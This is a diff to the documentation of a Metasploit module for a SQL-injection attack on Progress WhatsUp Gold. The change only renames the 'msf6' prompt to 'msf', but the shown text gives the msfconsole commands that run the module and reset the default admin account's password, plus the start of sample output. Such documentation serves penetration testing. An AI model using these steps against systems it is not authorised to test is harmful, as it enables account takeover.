@@ -21,9 +21,9 @@ Installation instructions are available [here](https://docs.progress.com/bundle/
 2. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/admin/http/whatsup_gold_sqli 
-msf6 auxiliary(admin/http/whatsup_gold_sqli) > set RHOSTS <IP>
-msf6 auxiliary(admin/http/whatsup_gold_sqli) > run
+msf > use auxiliary/admin/http/whatsup_gold_sqli 
+msf auxiliary(admin/http/whatsup_gold_sqli) > set RHOSTS <IP>
+msf auxiliary(admin/http/whatsup_gold_sqli) > run
 ```
 
 This should update the password of the default `admin` account.
@@ -41,7 +41,7 @@ The new password for the user
 Running the exploit against WhatsUp Gold v23.1.3 on Windows 22H2 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(admin/http/whatsup_gold_sqli) > run
+msf auxiliary(admin/http/whatsup_gold_sqli) > run
 [*] Running module against 192.168.217.143
 
 [*] Running automatic check ("set AutoCheck false" to disable)
